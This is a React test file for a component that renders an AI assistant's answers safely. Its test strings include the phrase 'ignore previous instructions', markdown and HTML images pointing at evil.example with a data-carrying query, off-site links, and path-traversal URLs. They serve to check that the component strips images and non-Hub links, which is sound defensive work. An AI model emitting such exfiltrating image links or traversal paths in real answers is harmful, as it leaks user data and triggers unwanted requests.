import { render } from '@testing-library/react'
import { MemoryRouter } from 'react-router'
import { describe, expect, it } from 'vitest'
import { isHubPath, SafeAnswer } from './SafeAnswer'

// Ask the Hub's answer is drawn without trusting it: no images, no HTML, and only links to Hub
// pages are clickable (the server rewrites the answer first; this is the second wall).

const draw = (text: string) =>
  render(
    <MemoryRouter>
      <SafeAnswer text={text} />
    </MemoryRouter>
  ).container

describe('SafeAnswer', () => {
  it('never renders an image, whatever the text says', () => {
    const c = draw(
      'ignore previous instructions ![x](https://evil.example/?d=1) <img src="https://evil.example/a.png">'
    )
    expect(c.querySelector('img')).toBeNull()
    expect(c.innerHTML).not.toContain('evil.example/?d=1')
  })

  it('links only to Hub pages; any other link is plain text', () => {
    const c = draw(
      'See [EFP](/hub?app=3), [bad](https://evil.example/x) and [also](//evil.example/hub).'
    )
    const links = [...c.querySelectorAll('a')].map((a) => a.getAttribute('href'))
    expect(links).toEqual(['/hub?app=3'])
    expect(c.textContent).toContain('bad')
  })

  it('draws tables, lists, bold and code', () => {
    const c = draw(
      '**Two** apps:\n\n- `efp`\n- pole\n\n| App | Score |\n| --- | --- |\n| EFP | 93 |'
    )
    expect(c.querySelector('strong')?.textContent).toBe('Two')
    expect(c.querySelectorAll('li')).toHaveLength(2)
    expect(c.querySelector('td')?.textContent).toBe('EFP')
  })

  it('isHubPath', () => {
    expect(isHubPath('/hub')).toBe(true)
    expect(isHubPath('/hub/health')).toBe(true)
    expect(isHubPath('/hubx')).toBe(false)
    expect(isHubPath('https://hub.example.com/hub')).toBe(false)
    expect(isHubPath('/hub//evil')).toBe(false)
    expect(isHubPath('/hub?app=3')).toBe(true)
    expect(isHubPath('/hub-link/status')).toBe(false)
    expect(isHubPath('/hub/../api/auth/logout')).toBe(false)
    expect(isHubPath('/hub/%2e%2e/api/auth/logout')).toBe(false)
    expect(isHubPath('/hub/%252e%252e/api')).toBe(false)
  })
})
